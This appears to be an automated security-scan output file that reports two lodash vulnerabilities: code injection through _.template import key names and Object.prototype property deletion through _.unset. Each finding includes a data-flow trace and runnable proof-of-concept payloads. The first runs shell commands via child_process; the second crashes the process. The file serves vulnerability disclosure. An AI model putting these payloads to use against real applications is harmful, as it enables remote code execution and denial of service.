@@ -1,0 +1,32 @@
+[
+  {
+    "finding_id": "8023927e-c93a-5cc8-bf55-a2af7e536561",
+    "session_id": "ChAyNDc3ZDNiYTYzYjQ0MjQ1EAgaATAqBG1haW4",
+    "title": "Arbitrary Code Execution in _.template via options.imports",
+    "file_path": "/home/jfplante_google_com/repos/h03-lodash_rep1/lodash.js",
+    "severity": "CRITICAL",
+    "confidence": 100,
+    "analysis": "### Data Flow Trace\n- **Source**: User input passed into `_.template(string, options)` via the `options` argument (specifically `options.imports`, or globally via `_.templateSettings.imports`).\n- **Sanitization/Validation**: While `CVE-2021-23337` was patched in 4.17.21 by adding `reForbiddenIdentifierChars` to validate `options.variable`, no sanitization or validation of any kind is performed on the property names of `options.imports` (or `settings.imports`). The keys are extracted verbatim via `keys(imports)` at line 14851.\n- **Sink**: At line 14942, `Function(importsKeys, sourceURL + 'return ' + source)` compiles a dynamic JavaScript function where `importsKeys` forms the formal parameter list of the wrapper function. At line 14943, `.apply(undefined, importsValues)` executes this dynamic function immediately.\n\nIn ECMAScript (ES6+), formal parameter lists support default parameter values (e.g. `param = expression`) and destructuring with computed property names (e.g. `{ [expression]: a } = {}`). By injecting an expression into a key of `options.imports`, when `Function` compiles the parameter list and invokes it with `.apply(undefined, importsValues)`, the JavaScript runtime evaluates the expression in the execution environment, granting arbitrary code execution.\n\n### Conceptual Exploit Payload\n```javascript\nconst _ = require('lodash');\n\n// Conceptual Payload 1: Using default parameter evaluation when value is undefined\n_.template('', {\n  imports: {\n    'a = process.mainModule.require(\"child_process\").execSync(\"id\").toString()': undefined\n  }\n});\n\n// Conceptual Payload 2: Using computed property name in parameter destructuring (works even if options come from JSON)\nconst options = JSON.parse('{\"imports\": {\"{ [process.mainModule.require(\\\\\"child_process\\\\\").execSync(\\\\\"id\\\\\")]: a } = {}\": 1}}');\n_.template('', options);\n```",
+    "snippet": "      var result = attempt(function() {\n        return Function(importsKeys, sourceURL + 'return ' + source)\n          .apply(undefined, importsValues);\n      });",
+    "vuln_type": "Improper Control of Generation of Code ('Code Injection')",
+    "vuln_id": "CWE-94",
+    "status": "OPEN",
+    "start_line": 14941,
+    "end_line": 14944
+  },
+  {
+    "finding_id": "a48ef319-549d-58af-8874-9e4b719659fe",
+    "session_id": "ChAyNDc3ZDNiYTYzYjQ0MjQ1EAgaATAqBG1haW4",
+    "title": "Prototype Property Deletion and Denial of Service in _.unset",
+    "file_path": "/home/jfplante_google_com/repos/h03-lodash_rep1/lodash.js",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "### Data Flow Trace\n- **Source**: User-supplied property path passed as the `path` argument to `_.unset(object, path)`.\n- **Sanitization/Validation**: Unlike `baseSet` (which explicitly aborts when encountering `__proto__`, `constructor`, or `prototype`), `baseUnset` performs no checks on the path components. It calls `parent(object, path)` which delegates to `baseGet(object, baseSlice(path, 0, -1))` without any validation against prototype pollution keys.\n- **Sink**: `delete object[toKey(last(path))]` at line 4374, where `object` resolves to `Object.prototype`.\n\nWhen a path traversing `__proto__` or `constructor.prototype` (e.g. `'__proto__.toString'` or `['__proto__', 'valueOf']`) is supplied to `_.unset`, `parent` navigates up the prototype chain and returns `Object.prototype`. The `delete` operator then removes critical built-in methods (such as `toString`, `valueOf`, or `hasOwnProperty`) from `Object.prototype` across the entire process. Any subsequent code or internal runtime mechanism that relies on standard object methods will throw an unhandled `TypeError` (e.g. `TypeError: ({}).toString is not a function`), causing an immediate denial of service or altering security-critical prototype properties.\n\n### Conceptual Exploit Payload\n```javascript\nconst _ = require('lodash');\n\n// Conceptual Payload: Delete toString from Object.prototype via _.unset\n_.unset({}, '__proto__.toString');\n// Or via constructor.prototype:\n// _.unset({}, 'constructor.prototype.valueOf');\n\n// Proof of impact: any standard object invocation crashes the process\n({}).toString(); // Uncaught TypeError: ({}).toString is not a function\n```",
+    "snippet": "    function baseUnset(object, path) {\n      path = castPath(path, object);\n      object = parent(object, path);\n      return object == null || delete object[toKey(last(path))];\n    }",
+    "vuln_type": "Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+    "vuln_id": "CWE-1321",
+    "status": "OPEN",
+    "start_line": 4371,
+    "end_line": 4375
+  }
+]
